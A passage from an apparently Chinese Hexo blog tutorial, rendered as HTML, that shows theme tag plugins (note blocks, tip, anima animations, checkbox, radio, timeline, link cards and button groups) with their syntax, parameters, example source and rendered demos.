flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div><p>4.<code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>2.<code>modern</code>样式</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>3.<code>flat</code>样式</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>4.<code>disabled</code>样式</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021年快到了…</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-5-上标标签-tip">2.5 上标标签 tip</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>自定义图标</code>: 支持fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义font awesome图标</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-6-动态标签-anima">2.6 动态标签 anima</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><div class="note info flat"><ol><li>将所需的CSS类添加到图标（或DOM中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定CSS类，同时还要给目标元素的父级元素添加CSS类<code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加CSS类<code>faa-fast</code>或<code>faa-slow</code>来控制动画快慢。</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.调整动画速度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div>2.调整动画速度<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hover（当鼠标悬停时显示动画）<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hover（当鼠标悬停在父级元素时显示动画）<div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban faa-parent animated-hover"><p class="faa-flash">ban</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-7-复选列表-checkbox">2.7 复选列表 checkbox</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: plus, minus, times</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-8-单选列表-radio">2.8 单选列表 radio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-9-时间轴-timeline">2.9 时间轴 timeline</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>title</code>:标题/时间线</li><li><code>color</code>:<code>timeline</code>颜色:default(留空) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间轴样式,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>时间轴样式</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>不需要额外处理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-10-链接卡片-link">2.10 链接卡片 link</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-11-按钮-btns">2.11 按钮 btns</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;</code>标题<code>&lt;/b&gt;</code>和<code>&lt;p&gt;</code>描述文字<code>&lt;/p&gt;</code></li><li>布局方式：<br>默认为自动宽度，适合视野内只有一两个的情况。</li></ol><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>wide</td><td>宽一点的按钮</td></tr><tr><td>fill</td><td>填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td>center</td><td>居中，按钮之间是固定间距</td></tr><tr><td>around</td><td>居中分散</td></tr><tr><td>grid2</td><td>等宽最多2列，屏幕变窄会适当减少列数</td></tr><tr><td>grid3</td><td>等宽最多3列，屏幕变窄会适当减少列数</td></tr><tr><td>grid4</td><td>等宽最多4列，屏幕变窄会适当减少列数</td></tr><tr><td>grid5</td><td>等宽最多5列，屏幕变窄会适当减少列数</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.或者含有图标的按钮</p><figure class="highlight markdown"><table><tr><td 